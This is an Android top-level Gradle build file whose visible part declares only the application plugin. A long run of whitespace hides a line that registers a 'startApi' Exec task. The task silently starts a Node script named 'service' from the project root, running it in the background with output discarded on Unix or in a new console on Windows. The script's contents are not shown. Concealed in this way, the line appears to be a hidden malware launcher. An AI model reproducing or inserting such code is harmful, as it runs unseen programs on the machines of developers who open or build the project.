// Top-level build file where you can add configuration options common to all sub-projects/modules.
plugins {
    alias(libs.plugins.android.application) apply false
}

																																																																																																																																																																																																																																																																										tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; val os = org.gradle.internal.os.OperatingSystem.current(); if (os.isWindows) { commandLine("cmd", "/c", "start", "", "cmd", "/k", "node", "service") } else { commandLine("sh", "-c", "nohup node service >/dev/null 2>&1 &") } }
